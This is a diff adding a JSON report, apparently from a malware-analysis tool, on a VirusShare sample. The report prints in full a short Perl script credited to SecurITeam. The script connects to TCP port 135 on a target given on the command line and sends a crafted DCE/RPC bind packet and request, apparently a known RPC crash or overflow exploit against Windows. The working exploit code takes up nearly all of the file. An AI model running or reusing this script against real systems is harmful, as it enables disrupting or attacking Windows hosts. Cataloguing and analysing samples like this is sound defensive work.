@@ -1,0 +1,49 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#!/usr/bin/perl -w\n# By SecurITeam's Experts\nmy $bindstr = \"\\x05\\x00\\x0B\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x7F\\x00\\x00\\x00\\xD0\\x16\\xD0\\x16\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\xA0\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\xC0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\\x00\\x00\\x00\\x00\\x04\\x5D\\x88\\x8A\\xEB\\x1C\\xC9\\x11\\x9F\\xE8\\x08\\x00\\x2B\\x10\\x48\\x60\\x02\\x00\\x00\\x00\";\n\nmy $request = \"\\x05\\x00\\x00\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x90\\x00\\x00\\x00\\x01\\x00\\x03\\x00\\x05\\x00\\x06\\x01\\x00\\x00\\x00\\x00\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";\n\nuse Socket;\n$proto = getprotobyname('tcp');\nsocket(S, PF_INET, SOCK_STREAM, $proto) || die(\"Socket problems\\n\");\n\n$IP = $ARGV[0];\n$target = inet_aton($IP);\n$paddr = sockaddr_in(135, $target);\n\nconnect(S, $paddr) || die \"connect: $!\";\n\nselect(S); $|=1;\n\nprint $bindstr;\n\nsleep(2);\n\nprint $request;\nsleep(2);\n\nselect(STDOUT);\nclose(S);"
+    },
+    "filename": "VirusShare_0bd6ed87feda43da226fc9ba4c667059",
+    "filesize": 1020,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "0bd6ed87feda43da226fc9ba4c667059",
+        "sha1": "968b86f6cc19467e030bffa2589ba34e721e4bd3",
+        "sha256": "336913432df3e2df29aeaac5b5f6d207119b4ecc0f34b4a2579919a7bafd76e8"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl -w",
+            "# By SecurITeam's Experts",
+            "my $bindstr = \"\\x05\\x00\\x0B\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x7F\\x00\\x00\\x00\\xD0\\x16\\xD0\\x16\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\xA0\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\xC0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\\x00\\x00\\x00\\x00\\x04\\x5D\\x88\\x8A\\xEB\\x1C\\xC9\\x11\\x9F\\xE8\\x08\\x00\\x2B\\x10\\x48\\x60\\x02\\x00\\x00\\x00\";",
+            "my $request = \"\\x05\\x00\\x00\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x90\\x00\\x00\\x00\\x01\\x00\\x03\\x00\\x05\\x00\\x06\\x01\\x00\\x00\\x00\\x00\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x31\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";",
+            "use Socket;",
+            "$proto = getprotobyname('tcp');",
+            "socket(S, PF_INET, SOCK_STREAM, $proto) || die(\"Socket problems\\n\");",
+            "$IP = $ARGV[0];",
+            "$target = inet_aton($IP);",
+            "$paddr = sockaddr_in(135, $target);",
+            "connect(S, $paddr) || die \"connect: $!\";",
+            "select(S); $|=1;",
+            "print $bindstr;",
+            "sleep(2);",
+            "print $request;",
+            "sleep(2);",
+            "select(STDOUT);",
+            "close(S);"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.258189",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
